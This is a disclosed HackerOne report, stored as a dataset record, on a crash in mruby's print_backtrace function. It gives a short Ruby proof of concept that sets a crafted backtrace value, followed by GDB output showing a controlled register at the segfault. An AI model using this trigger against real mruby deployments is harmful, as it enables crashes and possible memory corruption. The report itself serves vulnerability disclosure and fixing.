---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '197916'
original_report_id: '197916'
title: Crash in print_backtrace
weakness: Uncontrolled Resource Consumption
team_handle: shopify-scripts
created_at: '2017-01-12T19:29:27.356Z'
disclosed_at: '2017-02-07T07:42:25.944Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 3
tags:
- hackerone
- uncontrolled-resource-consumption
---

# Crash in print_backtrace

## Metadata

- HackerOne Report ID: 197916
- Weakness: Uncontrolled Resource Consumption
- Program: shopify-scripts
- Disclosed At: 2017-02-07T07:42:25.944Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

This crash does not affect `mruby-engine` because it does not print the back trace in guest. We can control the register by setting a backtrace array.

# PoC
```ruby
exc = Exception.new()
exc.set_backtrace([0x41414141])
raise exc
```

# GDB
```
$ gdb -q --args ./bin/mruby test12.rb
Reading symbols from ./bin/mruby...done.
(gdb) r
Starting program: /home/tunz/working/mruby/mruby/bin/mruby test12.rb
trace:

Program received signal SIGSEGV, Segmentation fault.
0x0000000000422b88 in print_backtrace (mrb=0x2333010, backtrace=...) at /home/tunz/working/mruby/mruby/src/backtrace.c:222
222         fprintf(stream, "\t[%d] %.*s\n", i, (int)RSTRING_LEN(entry), RSTRING_PTR(entry));
(gdb) x/i $pc
=> 0x422b88 <print_backtrace+130>:      mov    eax,DWORD PTR [rax]
(gdb) i r rax
rax            0x41414141       1094795585
```

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
